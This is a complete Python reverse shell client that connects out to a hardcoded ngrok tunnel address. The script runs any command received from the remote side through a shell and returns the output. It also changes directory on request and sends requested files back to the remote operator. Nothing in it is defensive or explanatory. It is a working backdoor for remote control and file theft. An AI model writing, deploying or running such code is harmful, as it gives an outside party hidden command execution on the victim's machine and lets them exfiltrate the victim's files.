import socket
import struct
import os
from subprocess import Popen, PIPE
host = '0.tcp.ngrok.io'
port = 10766
class Packet(object):
	def __init__(self, sock):
		self.sock = sock
	def send(self, data):
		pkt = struct.pack('>I', len(data)) + data
		self.sock.send(pkt)
	def recvall(self, n):
		buffer = b""
		while len(buffer) < n:
			frame = self.sock.recv(n - len(buffer))
			if not frame:
				return None
			buffer += frame
		return buffer
	def recv(self):
		pkt_len = self.recvall(4)
		if not pkt_len:
			return ""
		pkt_len = struct.unpack('>I', pkt_len)[0]
		return self.recvall(pkt_len)
def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	pkt = Packet(s)
	while True:
		data = pkt.recv().decode()
		if not data:
			continue
		elif 'exit' in data or 'quit' in data:
			s.close()
			break
		elif data[:2] == 'cd':
			os.chdir(data[3:])
			pkt.send('{}\n'.format(os.getcwd()).encode())
		elif data.split()[0] == 'download':
			file = data.split()[1]
			try:
				pkt.send(b'ok')
				with open(file, 'rb') as file:
					for data in iter(lambda: file.read(1024), b''):
						pkt.send(data)
				pkt.send(b'done')
			except FileNotFoundError:
				pkt.send(b'file_not_found')
		else:
			cmd = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
			ouput = cmd.communicate()[0]
			pkt.send(ouput)
if __name__ == '__main__':
	main()
